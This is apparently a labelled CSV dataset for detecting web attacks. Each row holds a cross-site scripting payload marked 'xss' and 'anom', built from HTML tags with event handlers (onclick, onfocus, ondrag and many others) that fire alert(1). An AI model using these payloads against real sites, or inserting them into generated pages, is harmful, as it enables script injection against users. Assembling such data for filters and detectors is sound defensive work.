payload,attack_type,label
"<big onbeforecut=""alert(1)"" contenteditable>test</big>",xss,anom
"<big onbeforepaste=""alert(1)"" contenteditable>test</big>",xss,anom
<big onblur=alert(1) tabindex=1 id=x></big><input autofocus>,xss,anom
"<big onclick=""alert(1)"">test</big>",xss,anom
"<big oncontextmenu=""alert(1)"">test</big>",xss,anom
"<big oncopy=""alert(1)"" contenteditable>test</big>",xss,anom
"<big oncut=""alert(1)"" contenteditable>test</big>",xss,anom
"<big ondblclick=""alert(1)"">test</big>",xss,anom
<big onfocusout=alert(1) tabindex=1 id=x></big><input autofocus>,xss,anom
"<big onkeydown=""alert(1)"" contenteditable>test</big>",xss,anom
"<big onkeypress=""alert(1)"" contenteditable>test</big>",xss,anom
"<big onkeyup=""alert(1)"" contenteditable>test</big>",xss,anom
"<big onmousedown=""alert(1)"">test</big>",xss,anom
"<big onmouseenter=""alert(1)"">test</big>",xss,anom
"<big onmouseleave=""alert(1)"">test</big>",xss,anom
"<big onmousemove=""alert(1)"">test</big>",xss,anom
"<big onmouseout=""alert(1)"">test</big>",xss,anom
"<big onmouseover=""alert(1)"">test</big>",xss,anom
"<big onmouseup=""alert(1)"">test</big>",xss,anom
"<big onpaste=""alert(1)"" contenteditable>test</big>",xss,anom
"<blink draggable=""true"" ondrag=""alert(1)"">test</blink>",xss,anom
"<blink draggable=""true"" ondragend=""alert(1)"">test</blink>",xss,anom
"<blink draggable=""true"" ondragenter=""alert(1)"">test</blink>",xss,anom
"<blink draggable=""true"" ondragleave=""alert(1)"">test</blink>",xss,anom
"<blink draggable=""true"" ondragstart=""alert(1)"">test</blink>",xss,anom
<blink id=x tabindex=1 onactivate=alert(1)></blink>,xss,anom
<blink id=x tabindex=1 onbeforeactivate=alert(1)></blink>,xss,anom
<blink id=x tabindex=1 onbeforedeactivate=alert(1)></blink><input autofocus>,xss,anom
<blink id=x tabindex=1 ondeactivate=alert(1)></blink><input id=y autofocus>,xss,anom
<blink id=x tabindex=1 onfocus=alert(1)></blink>,xss,anom
<blink id=x tabindex=1 onfocusin=alert(1)></blink>,xss,anom
"<blink onbeforecopy=""alert(1)"" contenteditable>test</blink>",xss,anom
"<blink onbeforecut=""alert(1)"" contenteditable>test</blink>",xss,anom
"<blink onbeforepaste=""alert(1)"" contenteditable>test</blink>",xss,anom
<blink onblur=alert(1) tabindex=1 id=x></blink><input autofocus>,xss,anom
"<blink onclick=""alert(1)"">test</blink>",xss,anom
"<blink oncontextmenu=""alert(1)"">test</blink>",xss,anom
"<blink oncopy=""alert(1)"" contenteditable>test</blink>",xss,anom
"<blink oncut=""alert(1)"" contenteditable>test</blink>",xss,anom
"<blink ondblclick=""alert(1)"">test</blink>",xss,anom
<blink onfocusout=alert(1) tabindex=1 id=x></blink><input autofocus>,xss,anom
"<blink onkeydown=""alert(1)"" contenteditable>test</blink>",xss,anom
"<blink onkeypress=""alert(1)"" contenteditable>test</blink>",xss,anom
"<blink onkeyup=""alert(1)"" contenteditable>test</blink>",xss,anom
"<blink onmousedown=""alert(1)"">test</blink>",xss,anom
"<blink onmouseenter=""alert(1)"">test</blink>",xss,anom
"<blink onmouseleave=""alert(1)"">test</blink>",xss,anom
"<blink onmousemove=""alert(1)"">test</blink>",xss,anom
"<blink onmouseout=""alert(1)"">test</blink>",xss,anom
"<blink onmouseover=""alert(1)"">test</blink>",xss,anom
"<blink onmouseup=""alert(1)"">test</blink>",xss,anom
"<blink onpaste=""alert(1)"" contenteditable>test</blink>",xss,anom
"<blockquote draggable=""true"" ondrag=""alert(1)"">test</blockquote>",xss,anom
"<blockquote draggable=""true"" ondragend=""alert(1)"">test</blockquote>",xss,anom
"<blockquote draggable=""true"" ondragenter=""alert(1)"">test</blockquote>",xss,anom
"<blockquote draggable=""true"" ondragleave=""alert(1)"">test</blockquote>",xss,anom
"<blockquote draggable=""true"" ondragstart=""alert(1)"">test</blockquote>",xss,anom
<blockquote id=x tabindex=1 onactivate=alert(1)></blockquote>,xss,anom
<blockquote id=x tabindex=1 onbeforeactivate=alert(1)></blockquote>,xss,anom
<blockquote id=x tabindex=1 onbeforedeactivate=alert(1)></blockquote><input autofocus>,xss,anom
<blockquote id=x tabindex=1 ondeactivate=alert(1)></blockquote><input id=y autofocus>,xss,anom
<blockquote id=x tabindex=1 onfocus=alert(1)></blockquote>,xss,anom
<blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>,xss,anom
"<blockquote onbeforecopy=""alert(1)"" contenteditable>test</blockquote>",xss,anom
"<blockquote onbeforecut=""alert(1)"" contenteditable>test</blockquote>",xss,anom
"<blockquote onbeforepaste=""alert(1)"" contenteditable>test</blockquote>",xss,anom
<blockquote onblur=alert(1) tabindex=1 id=x></blockquote><input autofocus>,xss,anom
"<blockquote onclick=""alert(1)"">test</blockquote>",xss,anom
"<blockquote oncontextmenu=""alert(1)"">test</blockquote>",xss,anom
"<blockquote oncopy=""alert(1)"" contenteditable>test</blockquote>",xss,anom
"<blockquote oncut=""alert(1)"" contenteditable>test</blockquote>",xss,anom
"<blockquote ondblclick=""alert(1)"">test</blockquote>",xss,anom
<blockquote onfocusout=alert(1) tabindex=1 id=x></blockquote><input autofocus>,xss,anom
"<blockquote onkeydown=""alert(1)"" contenteditable>test</blockquote>",xss,anom
"<blockquote onkeypress=""alert(1)"" contenteditable>test</blockquote>",xss,anom
"<blockquote onkeyup=""alert(1)"" contenteditable>test</blockquote>",xss,anom
"<blockquote onmousedown=""alert(1)"">test</blockquote>",xss,anom
"<blockquote onmouseenter=""alert(1)"">test</blockquote>",xss,anom
"<blockquote onmouseleave=""alert(1)"">test</blockquote>",xss,anom
"<blockquote onmousemove=""alert(1)"">test</blockquote>",xss,anom
"<blockquote onmouseout=""alert(1)"">test</blockquote>",xss,anom
"<blockquote onmouseover=""alert(1)"">test</blockquote>",xss,anom
"<blockquote onmouseup=""alert(1)"">test</blockquote>",xss,anom
"<blockquote onpaste=""alert(1)"" contenteditable>test</blockquote>",xss,anom
"<body draggable=""true"" ondrag=""alert(1)"">test</body>",xss,anom
"<body draggable=""true"" ondragend=""alert(1)"">test</body>",xss,anom
"<body draggable=""true"" ondragenter=""alert(1)"">test</body>",xss,anom
"<body draggable=""true"" ondragleave=""alert(1)"">test</body>",xss,anom
"<body draggable=""true"" ondragstart=""alert(1)"">test</body>",xss,anom
<body id=x tabindex=1 onactivate=alert(1)></body>,xss,anom
<body id=x tabindex=1 onbeforeactivate=alert(1)></body>,xss,anom
<body id=x tabindex=1 onbeforedeactivate=alert(1)></body><input autofocus>,xss,anom
<body id=x tabindex=1 ondeactivate=alert(1)></body><input id=y autofocus>,xss,anom
<body id=x tabindex=1 onfocus=alert(1)></body>,xss,anom
<body id=x tabindex=1 onfocusin=alert(1)></body>,xss,anom
<body onafterprint=alert(1)>,xss,anom
"<body onbeforecopy=""alert(1)"" contenteditable>test</body>",xss,anom
"<body onbeforecut=""alert(1)"" contenteditable>test</body>",xss,anom
"<body onbeforepaste=""alert(1)"" contenteditable>test</body>",xss,anom
<body onbeforeprint=alert(1)>,xss,anom
"<body onbeforeunload=""location='javascript:alert(1)'"">",xss,anom
<body onblur=alert(1) id=x><iframe id=x>,xss,anom
"<body onclick=""alert(1)"">test</body>",xss,anom
"<body oncontextmenu=""alert(1)"">test</body>",xss,anom
"<body oncopy=""alert(1)"" contenteditable>test</body>",xss,anom
"<body oncut=""alert(1)"" contenteditable>test</body>",xss,anom
"<body ondblclick=""alert(1)"">test</body>",xss,anom
<body onerror=alert(1) onload=/>,xss,anom
<body onfocusout=alert(1) id=x><iframe id=x>,xss,anom
"<body onhashchange=""alert(1)"">",xss,anom
"<body onkeydown=""alert(1)"" contenteditable>test</body>",xss,anom
"<body onkeypress=""alert(1)"" contenteditable>test</body>",xss,anom
"<body onkeyup=""alert(1)"" contenteditable>test</body>",xss,anom
<body onload=alert(1)>,xss,anom
<body onmessage=alert(1)>,xss,anom
"<body onmousedown=""alert(1)"">test</body>",xss,anom
"<body onmouseenter=""alert(1)"">test</body>",xss,anom
"<body onmouseleave=""alert(1)"">test</body>",xss,anom
"<body onmousemove=""alert(1)"">test</body>",xss,anom
"<body onmouseout=""alert(1)"">test</body>",xss,anom
"<body onmouseover=""alert(1)"">test</body>",xss,anom
"<body onmouseup=""alert(1)"">test</body>",xss,anom
<body onpageshow=alert(1)>,xss,anom
"<body onpaste=""alert(1)"" contenteditable>test</body>",xss,anom
<body onpopstate=alert(1)>,xss,anom
"<body onresize=""alert(1)"">",xss,anom
<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>,xss,anom
<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>,xss,anom
<body onwheel=alert(1)>,xss,anom
"<br draggable=""true"" ondrag=""alert(1)"">test</br>",xss,anom
"<br draggable=""true"" ondragend=""alert(1)"">test</br>",xss,anom
"<br draggable=""true"" ondragenter=""alert(1)"">test</br>",xss,anom
"<br draggable=""true"" ondragleave=""alert(1)"">test</br>",xss,anom
"<br draggable=""true"" ondragstart=""alert(1)"">test</br>",xss,anom
<br id=x tabindex=1 onactivate=alert(1)></br>,xss,anom
<br id=x tabindex=1 onbeforeactivate=alert(1)></br>,xss,anom
<br id=x tabindex=1 onbeforedeactivate=alert(1)></br><input autofocus>,xss,anom
<br id=x tabindex=1 ondeactivate=alert(1)></br><input id=y autofocus>,xss,anom
<br id=x tabindex=1 onfocus=alert(1)></br>,xss,anom
<br id=x tabindex=1 onfocusin=alert(1)></br>,xss,anom
"<br onbeforecopy=""alert(1)"" contenteditable>test</br>",xss,anom
"<br onbeforecut=""alert(1)"" contenteditable>test</br>",xss,anom
"<br onbeforepaste=""alert(1)"" contenteditable>test</br>",xss,anom
<br onblur=alert(1) tabindex=1 id=x></br><input autofocus>,xss,anom
"<br onclick=""alert(1)"">test</br>",xss,anom
"<br oncontextmenu=""alert(1)"">test</br>",xss,anom
"<br oncopy=""alert(1)"" contenteditable>test</br>",xss,anom
"<br oncut=""alert(1)"" contenteditable>test</br>",xss,anom
"<br ondblclick=""alert(1)"">test</br>",xss,anom
<br onfocusout=alert(1) tabindex=1 id=x></br><input autofocus>,xss,anom
"<br onkeydown=""alert(1)"" contenteditable>test</br>",xss,anom
"<br onkeypress=""alert(1)"" contenteditable>test</br>",xss,anom
"<br onkeyup=""alert(1)"" contenteditable>test</br>",xss,anom
"<br onmousedown=""alert(1)"">test</br>",xss,anom
"<br onmouseenter=""alert(1)"">test</br>",xss,anom
"<br onmouseleave=""alert(1)"">test</br>",xss,anom
"<br onmousemove=""alert(1)"">test</br>",xss,anom
"<br onmouseout=""alert(1)"">test</br>",xss,anom
"<br onmouseover=""alert(1)"">test</br>",xss,anom
"<br onmouseup=""alert(1)"">test</br>",xss,anom
"<br onpaste=""alert(1)"" contenteditable>test</br>",xss,anom
<button autofocus onfocus=alert(1)>test</button>,xss,anom
<button autofocus onfocusin=alert(1)>test</button>,xss,anom
"<button draggable=""true"" ondrag=""alert(1)"">test</button>",xss,anom
"<button draggable=""true"" ondragend=""alert(1)"">test</button>",xss,anom
"<button draggable=""true"" ondragenter=""alert(1)"">test</button>",xss,anom
"<button draggable=""true"" ondragleave=""alert(1)"">test</button>",xss,anom
"<button draggable=""true"" ondragstart=""alert(1)"">test</button>",xss,anom
<button id=x tabindex=1 onactivate=alert(1)></button>,xss,anom
<button id=x tabindex=1 onbeforeactivate=alert(1)></button>,xss,anom
<button id=x tabindex=1 onbeforedeactivate=alert(1)></button><input autofocus>,xss,anom
<button id=x tabindex=1 ondeactivate=alert(1)></button><input id=y autofocus>,xss,anom
"<button onbeforecopy=""alert(1)"" contenteditable>test</button>",xss,anom
"<button onbeforecut=""alert(1)"" contenteditable>test</button>",xss,anom
"<button onbeforepaste=""alert(1)"" contenteditable>test</button>",xss,anom
<button onblur=alert(1) id=x></button><input autofocus>,xss,anom
"<button onclick=""alert(1)"">test</button>",xss,anom
"<button oncontextmenu=""alert(1)"">test</button>",xss,anom
"<button oncopy=""alert(1)"" contenteditable>test</button>",xss,anom
"<button oncut=""alert(1)"" contenteditable>test</button>",xss,anom
"<button ondblclick=""alert(1)"">test</button>",xss,anom
<button onfocusout=alert(1) id=x></button><input autofocus>,xss,anom
"<button onkeydown=""alert(1)"" contenteditable>test</button>",xss,anom
"<button onkeypress=""alert(1)"" contenteditable>test</button>",xss,anom
"<button onkeyup=""alert(1)"" contenteditable>test</button>",xss,anom
"<button onmousedown=""alert(1)"">test</button>",xss,anom
"<button onmouseenter=""alert(1)"">test</button>",xss,anom
"<button onmouseleave=""alert(1)"">test</button>",xss,anom
"<button onmousemove=""alert(1)"">test</button>",xss,anom
"<button onmouseout=""alert(1)"">test</button>",xss,anom
"<button onmouseover=""alert(1)"">test</button>",xss,anom
"<button onmouseup=""alert(1)"">test</button>",xss,anom
"<button onpaste=""alert(1)"" contenteditable>test</button>",xss,anom
"<canvas draggable=""true"" ondrag=""alert(1)"">test</canvas>",xss,anom
"<canvas draggable=""true"" ondragend=""alert(1)"">test</canvas>",xss,anom
"<canvas draggable=""true"" ondragenter=""alert(1)"">test</canvas>",xss,anom
"<canvas draggable=""true"" ondragleave=""alert(1)"">test</canvas>",xss,anom
"<canvas draggable=""true"" ondragstart=""alert(1)"">test</canvas>",xss,anom
<canvas id=x tabindex=1 onactivate=alert(1)></canvas>,xss,anom
<canvas id=x tabindex=1 onbeforeactivate=alert(1)></canvas>,xss,anom
<canvas id=x tabindex=1 onbeforedeactivate=alert(1)></canvas><input autofocus>,xss,anom
<canvas id=x tabindex=1 ondeactivate=alert(1)></canvas><input id=y autofocus>,xss,anom
<canvas id=x tabindex=1 onfocus=alert(1)></canvas>,xss,anom
<canvas id=x tabindex=1 onfocusin=alert(1)></canvas>,xss,anom
"<canvas onbeforecopy=""alert(1)"" contenteditable>test</canvas>",xss,anom
"<canvas onbeforecut=""alert(1)"" contenteditable>test</canvas>",xss,anom
"<canvas onbeforepaste=""alert(1)"" contenteditable>test</canvas>",xss,anom
<canvas onblur=alert(1) tabindex=1 id=x></canvas><input autofocus>,xss,anom
"<canvas onclick=""alert(1)"">test</canvas>",xss,anom
"<canvas oncontextmenu=""alert(1)"">test</canvas>",xss,anom
"<canvas oncopy=""alert(1)"" contenteditable>test</canvas>",xss,anom
"<canvas oncut=""alert(1)"" contenteditable>test</canvas>",xss,anom
"<canvas ondblclick=""alert(1)"">test</canvas>",xss,anom
<canvas onfocusout=alert(1) tabindex=1 id=x></canvas><input autofocus>,xss,anom
"<canvas onkeydown=""alert(1)"" contenteditable>test</canvas>",xss,anom
"<canvas onkeypress=""alert(1)"" contenteditable>test</canvas>",xss,anom
"<canvas onkeyup=""alert(1)"" contenteditable>test</canvas>",xss,anom
"<canvas onmousedown=""alert(1)"">test</canvas>",xss,anom
"<canvas onmouseenter=""alert(1)"">test</canvas>",xss,anom
"<canvas onmouseleave=""alert(1)"">test</canvas>",xss,anom
"<canvas onmousemove=""alert(1)"">test</canvas>",xss,anom
"<canvas onmouseout=""alert(1)"">test</canvas>",xss,anom
"<canvas onmouseover=""alert(1)"">test</canvas>",xss,anom
"<canvas onmouseup=""alert(1)"">test</canvas>",xss,anom
"<canvas onpaste=""alert(1)"" contenteditable>test</canvas>",xss,anom
"<caption draggable=""true"" ondrag=""alert(1)"">test</caption>",xss,anom
"<caption draggable=""true"" ondragend=""alert(1)"">test</caption>",xss,anom
"<caption draggable=""true"" ondragenter=""alert(1)"">test</caption>",xss,anom
"<caption draggable=""true"" ondragleave=""alert(1)"">test</caption>",xss,anom
"<caption draggable=""true"" ondragstart=""alert(1)"">test</caption>",xss,anom
<caption id=x tabindex=1 onactivate=alert(1)></caption>,xss,anom
<caption id=x tabindex=1 onbeforeactivate=alert(1)></caption>,xss,anom
<caption id=x tabindex=1 onbeforedeactivate=alert(1)></caption><input autofocus>,xss,anom
<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>,xss,anom
<caption id=x tabindex=1 onfocus=alert(1)></caption>,xss,anom
<caption id=x tabindex=1 onfocusin=alert(1)></caption>,xss,anom
"<caption onbeforecopy=""alert(1)"" contenteditable>test</caption>",xss,anom
"<caption onbeforecut=""alert(1)"" contenteditable>test</caption>",xss,anom
"<caption onbeforepaste=""alert(1)"" contenteditable>test</caption>",xss,anom
<caption onblur=alert(1) tabindex=1 id=x></caption><input autofocus>,xss,anom
"<caption onclick=""alert(1)"">test</caption>",xss,anom
"<caption oncontextmenu=""alert(1)"">test</caption>",xss,anom
"<caption oncopy=""alert(1)"" contenteditable>test</caption>",xss,anom
"<caption oncut=""alert(1)"" contenteditable>test</caption>",xss,anom
"<caption ondblclick=""alert(1)"">test</caption>",xss,anom
<caption onfocusout=alert(1) tabindex=1 id=x></caption><input autofocus>,xss,anom
"<caption onkeydown=""alert(1)"" contenteditable>test</caption>",xss,anom
"<caption onkeypress=""alert(1)"" contenteditable>test</caption>",xss,anom
"<caption onkeyup=""alert(1)"" contenteditable>test</caption>",xss,anom
"<caption onmousedown=""alert(1)"">test</caption>",xss,anom
"<caption onmouseenter=""alert(1)"">test</caption>",xss,anom
"<caption onmouseleave=""alert(1)"">test</caption>",xss,anom
"<caption onmousemove=""alert(1)"">test</caption>",xss,anom
"<caption onmouseout=""alert(1)"">test</caption>",xss,anom
"<caption onmouseover=""alert(1)"">test</caption>",xss,anom
"<caption onmouseup=""alert(1)"">test</caption>",xss,anom
"<caption onpaste=""alert(1)"" contenteditable>test</caption>",xss,anom
"<center draggable=""true"" ondrag=""alert(1)"">test</center>",xss,anom
"<center draggable=""true"" ondragend=""alert(1)"">test</center>",xss,anom
"<center draggable=""true"" ondragenter=""alert(1)"">test</center>",xss,anom
"<center draggable=""true"" ondragleave=""alert(1)"">test</center>",xss,anom
"<center draggable=""true"" ondragstart=""alert(1)"">test</center>",xss,anom
<center id=x tabindex=1 onactivate=alert(1)></center>,xss,anom
<center id=x tabindex=1 onbeforeactivate=alert(1)></center>,xss,anom
<center id=x tabindex=1 onbeforedeactivate=alert(1)></center><input autofocus>,xss,anom
<center id=x tabindex=1 ondeactivate=alert(1)></center><input id=y autofocus>,xss,anom
<center id=x tabindex=1 onfocus=alert(1)></center>,xss,anom
<center id=x tabindex=1 onfocusin=alert(1)></center>,xss,anom
"<center onbeforecopy=""alert(1)"" contenteditable>test</center>",xss,anom
"<center onbeforecut=""alert(1)"" contenteditable>test</center>",xss,anom
"<center onbeforepaste=""alert(1)"" contenteditable>test</center>",xss,anom
<center onblur=alert(1) tabindex=1 id=x></center><input autofocus>,xss,anom
"<center onclick=""alert(1)"">test</center>",xss,anom
"<center oncontextmenu=""alert(1)"">test</center>",xss,anom
"<center oncopy=""alert(1)"" contenteditable>test</center>",xss,anom
"<center oncut=""alert(1)"" contenteditable>test</center>",xss,anom
"<center ondblclick=""alert(1)"">test</center>",xss,anom
<center onfocusout=alert(1) tabindex=1 id=x></center><input autofocus>,xss,anom
"<center onkeydown=""alert(1)"" contenteditable>test</center>",xss,anom
"<center onkeypress=""alert(1)"" contenteditable>test</center>",xss,anom
"<center onkeyup=""alert(1)"" contenteditable>test</center>",xss,anom
"<center onmousedown=""alert(1)"">test</center>",xss,anom
"<center onmouseenter=""alert(1)"">test</center>",xss,anom
"<center onmouseleave=""alert(1)"">test</center>",xss,anom
"<center onmousemove=""alert(1)"">test</center>",xss,anom
"<center onmouseout=""alert(1)"">test</center>",xss,anom
"<center onmouseover=""alert(1)"">test</center>",xss,anom
"<center onmouseup=""alert(1)"">test</center>",xss,anom
"<center onpaste=""alert(1)"" contenteditable>test</center>",xss,anom
"<cite draggable=""true"" ondrag=""alert(1)"">test</cite>",xss,anom
"<cite draggable=""true"" ondragend=""alert(1)"">test</cite>",xss,anom
"<cite draggable=""true"" ondragenter=""alert(1)"">test</cite>",xss,anom
"<cite draggable=""true"" ondragleave=""alert(1)"">test</cite>",xss,anom
"<cite draggable=""true"" ondragstart=""alert(1)"">test</cite>",xss,anom
<cite id=x tabindex=1 onactivate=alert(1)></cite>,xss,anom
<cite id=x tabindex=1 onbeforeactivate=alert(1)></cite>,xss,anom
<cite id=x tabindex=1 onbeforedeactivate=alert(1)></cite><input autofocus>,xss,anom
<cite id=x tabindex=1 ondeactivate=alert(1)></cite><input id=y autofocus>,xss,anom
<cite id=x tabindex=1 onfocus=alert(1)></cite>,xss,anom
<cite id=x tabindex=1 onfocusin=alert(1)></cite>,xss,anom
"<cite onbeforecopy=""alert(1)"" contenteditable>test</cite>",xss,anom
"<cite onbeforecut=""alert(1)"" contenteditable>test</cite>",xss,anom
"<cite onbeforepaste=""alert(1)"" contenteditable>test</cite>",xss,anom
<cite onblur=alert(1) tabindex=1 id=x></cite><input autofocus>,xss,anom
"<cite onclick=""alert(1)"">test</cite>",xss,anom
"<cite oncontextmenu=""alert(1)"">test</cite>",xss,anom
"<cite oncopy=""alert(1)"" contenteditable>test</cite>",xss,anom
"<cite oncut=""alert(1)"" contenteditable>test</cite>",xss,anom
"<cite ondblclick=""alert(1)"">test</cite>",xss,anom
<cite onfocusout=alert(1) tabindex=1 id=x></cite><input autofocus>,xss,anom
"<cite onkeydown=""alert(1)"" contenteditable>test</cite>",xss,anom
"<cite onkeypress=""alert(1)"" contenteditable>test</cite>",xss,anom
"<cite onkeyup=""alert(1)"" contenteditable>test</cite>",xss,anom
"<cite onmousedown=""alert(1)"">test</cite>",xss,anom
"<cite onmouseenter=""alert(1)"">test</cite>",xss,anom
"<cite onmouseleave=""alert(1)"">test</cite>",xss,anom
"<cite onmousemove=""alert(1)"">test</cite>",xss,anom
"<cite onmouseout=""alert(1)"">test</cite>",xss,anom
"<cite onmouseover=""alert(1)"">test</cite>",xss,anom
"<cite onmouseup=""alert(1)"">test</cite>",xss,anom
"<cite onpaste=""alert(1)"" contenteditable>test</cite>",xss,anom
"<code draggable=""true"" ondrag=""alert(1)"">test</code>",xss,anom
"<code draggable=""true"" ondragend=""alert(1)"">test</code>",xss,anom
"<code draggable=""true"" ondragenter=""alert(1)"">test</code>",xss,anom
"<code draggable=""true"" ondragleave=""alert(1)"">test</code>",xss,anom
"<code draggable=""true"" ondragstart=""alert(1)"">test</code>",xss,anom
<code id=x tabindex=1 onactivate=alert(1)></code>,xss,anom
<code id=x tabindex=1 onbeforeactivate=alert(1)></code>,xss,anom
<code id=x tabindex=1 onbeforedeactivate=alert(1)></code><input autofocus>,xss,anom
<code id=x tabindex=1 ondeactivate=alert(1)></code><input id=y autofocus>,xss,anom
<code id=x tabindex=1 onfocus=alert(1)></code>,xss,anom
<code id=x tabindex=1 onfocusin=alert(1)></code>,xss,anom
"<code onbeforecopy=""alert(1)"" contenteditable>test</code>",xss,anom
"<code onbeforecut=""alert(1)"" contenteditable>test</code>",xss,anom
"<code onbeforepaste=""alert(1)"" contenteditable>test</code>",xss,anom
<code onblur=alert(1) tabindex=1 id=x></code><input autofocus>,xss,anom
"<code onclick=""alert(1)"">test</code>",xss,anom
"<code oncontextmenu=""alert(1)"">test</code>",xss,anom
"<code oncopy=""alert(1)"" contenteditable>test</code>",xss,anom
"<code oncut=""alert(1)"" contenteditable>test</code>",xss,anom
"<code ondblclick=""alert(1)"">test</code>",xss,anom
<code onfocusout=alert(1) tabindex=1 id=x></code><input autofocus>,xss,anom
"<code onkeydown=""alert(1)"" contenteditable>test</code>",xss,anom
"<code onkeypress=""alert(1)"" contenteditable>test</code>",xss,anom
"<code onkeyup=""alert(1)"" contenteditable>test</code>",xss,anom
"<code onmousedown=""alert(1)"">test</code>",xss,anom
"<code onmouseenter=""alert(1)"">test</code>",xss,anom
"<code onmouseleave=""alert(1)"">test</code>",xss,anom
"<code onmousemove=""alert(1)"">test</code>",xss,anom
"<code onmouseout=""alert(1)"">test</code>",xss,anom
"<code onmouseover=""alert(1)"">test</code>",xss,anom
"<code onmouseup=""alert(1)"">test</code>",xss,anom
"<code onpaste=""alert(1)"" contenteditable>test</code>",xss,anom
"<col draggable=""true"" ondrag=""alert(1)"">test</col>",xss,anom
"<col draggable=""true"" ondragend=""alert(1)"">test</col>",xss,anom
"<col draggable=""true"" ondragenter=""alert(1)"">test</col>",xss,anom
"<col draggable=""true"" ondragleave=""alert(1)"">test</col>",xss,anom
"<col draggable=""true"" ondragstart=""alert(1)"">test</col>",xss,anom
<col id=x tabindex=1 onactivate=alert(1)></col>,xss,anom
<col id=x tabindex=1 onbeforeactivate=alert(1)></col>,xss,anom
<col id=x tabindex=1 onbeforedeactivate=alert(1)></col><input autofocus>,xss,anom
<col id=x tabindex=1 ondeactivate=alert(1)></col><input id=y autofocus>,xss,anom
<col id=x tabindex=1 onfocus=alert(1)></col>,xss,anom
<col id=x tabindex=1 onfocusin=alert(1)></col>,xss,anom
"<col onbeforecopy=""alert(1)"" contenteditable>test</col>",xss,anom
"<col onbeforecut=""alert(1)"" contenteditable>test</col>",xss,anom
"<col onbeforepaste=""alert(1)"" contenteditable>test</col>",xss,anom
<col onblur=alert(1) tabindex=1 id=x></col><input autofocus>,xss,anom
"<col onclick=""alert(1)"">test</col>",xss,anom
"<col oncontextmenu=""alert(1)"">test</col>",xss,anom
"<col oncopy=""alert(1)"" contenteditable>test</col>",xss,anom
"<col oncut=""alert(1)"" contenteditable>test</col>",xss,anom
"<col ondblclick=""alert(1)"">test</col>",xss,anom
<col onfocusout=alert(1) tabindex=1 id=x></col><input autofocus>,xss,anom
"<col onkeydown=""alert(1)"" contenteditable>test</col>",xss,anom
"<col onkeypress=""alert(1)"" contenteditable>test</col>",xss,anom
"<col onkeyup=""alert(1)"" contenteditable>test</col>",xss,anom
"<col onmousedown=""alert(1)"">test</col>",xss,anom
"<col onmouseenter=""alert(1)"">test</col>",xss,anom
"<col onmouseleave=""alert(1)"">test</col>",xss,anom
"<col onmousemove=""alert(1)"">test</col>",xss,anom
"<col onmouseout=""alert(1)"">test</col>",xss,anom
"<col onmouseover=""alert(1)"">test</col>",xss,anom
"<col onmouseup=""alert(1)"">test</col>",xss,anom
"<col onpaste=""alert(1)"" contenteditable>test</col>",xss,anom
"<colgroup draggable=""true"" ondrag=""alert(1)"">test</colgroup>",xss,anom
"<colgroup draggable=""true"" ondragend=""alert(1)"">test</colgroup>",xss,anom
"<colgroup draggable=""true"" ondragenter=""alert(1)"">test</colgroup>",xss,anom
"<colgroup draggable=""true"" ondragleave=""alert(1)"">test</colgroup>",xss,anom
"<colgroup draggable=""true"" ondragstart=""alert(1)"">test</colgroup>",xss,anom
<colgroup id=x tabindex=1 onactivate=alert(1)></colgroup>,xss,anom
<colgroup id=x tabindex=1 onbeforeactivate=alert(1)></colgroup>,xss,anom
<colgroup id=x tabindex=1 onbeforedeactivate=alert(1)></colgroup><input autofocus>,xss,anom
<colgroup id=x tabindex=1 ondeactivate=alert(1)></colgroup><input id=y autofocus>,xss,anom
<colgroup id=x tabindex=1 onfocus=alert(1)></colgroup>,xss,anom
<colgroup id=x tabindex=1 onfocusin=alert(1)></colgroup>,xss,anom
"<colgroup onbeforecopy=""alert(1)"" contenteditable>test</colgroup>",xss,anom
"<colgroup onbeforecut=""alert(1)"" contenteditable>test</colgroup>",xss,anom
"<colgroup onbeforepaste=""alert(1)"" contenteditable>test</colgroup>",xss,anom
<colgroup onblur=alert(1) tabindex=1 id=x></colgroup><input autofocus>,xss,anom
"<colgroup onclick=""alert(1)"">test</colgroup>",xss,anom
"<colgroup oncontextmenu=""alert(1)"">test</colgroup>",xss,anom
"<colgroup oncopy=""alert(1)"" contenteditable>test</colgroup>",xss,anom
"<colgroup oncut=""alert(1)"" contenteditable>test</colgroup>",xss,anom
"<colgroup ondblclick=""alert(1)"">test</colgroup>",xss,anom
<colgroup onfocusout=alert(1) tabindex=1 id=x></colgroup><input autofocus>,xss,anom
